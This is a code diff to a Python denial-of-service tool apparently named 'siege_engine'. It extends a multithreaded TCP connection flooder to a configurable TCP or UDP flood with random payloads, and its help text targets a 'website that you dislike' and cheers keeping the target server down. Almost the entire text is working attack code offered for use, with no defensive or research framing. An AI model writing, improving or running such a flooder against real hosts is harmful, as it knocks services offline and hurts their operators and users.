@@ -2,43 +2,66 @@ import socket
 import threading
 import time
 import sys
+import argparse
+import random
 
 connections = 0
 
-def flood_tcp(host: str):
+def flood(host: str, port: int, protocol: str):
     global connections
+    # https://stackoverflow.com/questions/5815675/what-is-sock-dgram-and-sock-stream
+    if protocol == 'TCP':
+        socket_type = socket.SOCK_STREAM
+    elif protocol == 'UDP':
+        socket_type = socket.SOCK_DGRAM
+    else:
+        raise RuntimeError('Unexpected protocol {}'.format(protocol))
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3)
-        sock.connect((host, 443))
-        time.sleep(3)
-        sock.close()
+        sock = socket.socket(socket.AF_INET, socket_type)
+        if protocol == 'TCP':
+            sock.settimeout(3)
+            sock.connect((host, port))
+            time.sleep(3)
+            sock.close()
+        elif protocol == 'UDP':
+            # https://github.com/Leeon123/TCP-UDP-Flood/blob/master/flood.py
+            data = random._urandom(1024)
+            for i in range(100):
+                sock.sendto(data, (host, port))
         connections += 1
     except (socket.error, socket.timeout):
         pass
 
 
 class DoYourThing(threading.Thread):
-    def __init__(self, hostname: str):
+    def __init__(self, hostname: str, port: int, protocol: str):
         self.hostname = hostname
+        self.port = port
+        self.protocol = protocol
         super().__init__(daemon=True)
 
     def run(self):
         while True:
-            flood_tcp(self.hostname)
+            flood(self.hostname, self.port, self.protocol)
+
+
+def parse_args():
+    ap = argparse.ArgumentParser()
+    ap.add_argument('threads', type=int, help='Number of threads you want to ping')
+    ap.add_argument('url', type=str, help='website that you dislike')
+    ap.add_argument('--port', default=443, type=int, help='Port to connect to')
+    ap.add_argument('--protocol', default='TCP', type=str, choices=['TCP', 'UDP'], help='which protocol to use')
+    args = ap.parse_args()
+    return args
 
 
 def run():
     global connections
-    if len(sys.argv) < 3:
-        print('Correct usage is python -m siege_engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru')
-        sys.exit(1)
-    amount, hostname = sys.argv[1:]
-    print('SYN flooding %s on %s threads' % (hostname, amount))
-    amount = int(amount)
+    args = parse_args()
+    print('SYN flooding %s on %d threads' % (args.url, args.threads))
     now = (time.time())
-    for _ in range(amount):
-        DoYourThing(hostname).start()
+    for _ in range(args.threads):
+        DoYourThing(args.url, args.port, args.protocol).start()
     wasted_bytes = 0
     while True:
         try:
@@ -48,7 +71,7 @@ def run():
                     print('The target server is down. Let us keep it that way.')
                 else:
                     print('Last seconds made', connections, 'calls which involved', connections*24, 'wasted bytes on the behalf of',
-                          hostname)
+                          args.url)
                     wasted_bytes += connections * 24
                     connections = 0
         except KeyboardInterrupt:
